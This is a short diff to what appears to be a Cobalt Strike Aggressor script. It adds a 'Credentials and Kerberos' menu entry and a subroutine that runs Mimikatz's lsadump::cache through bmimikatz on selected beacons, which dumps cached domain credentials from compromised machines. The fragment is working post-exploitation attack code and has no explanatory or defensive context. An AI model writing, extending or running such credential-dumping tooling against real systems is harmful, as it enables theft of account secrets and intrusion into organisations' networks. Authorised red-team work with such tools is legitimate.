@@ -322,7 +322,17 @@ menu "Credentials and Kerberos"
 
 			}
 
-		
+		item "List Cached Credentials AKA lsadump::cache"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					lsadumpcache($bid);
+
+				}
+
+			}
 
 
 
@@ -368,6 +378,16 @@ menu "Credentials and Kerberos"
 ##
 
 ###########################
+
+sub lsadumpcache{
+
+
+
+bmimikatz($1, "lsadump::cache");
+
+
+
+}
 
 sub rubeustriage{
 
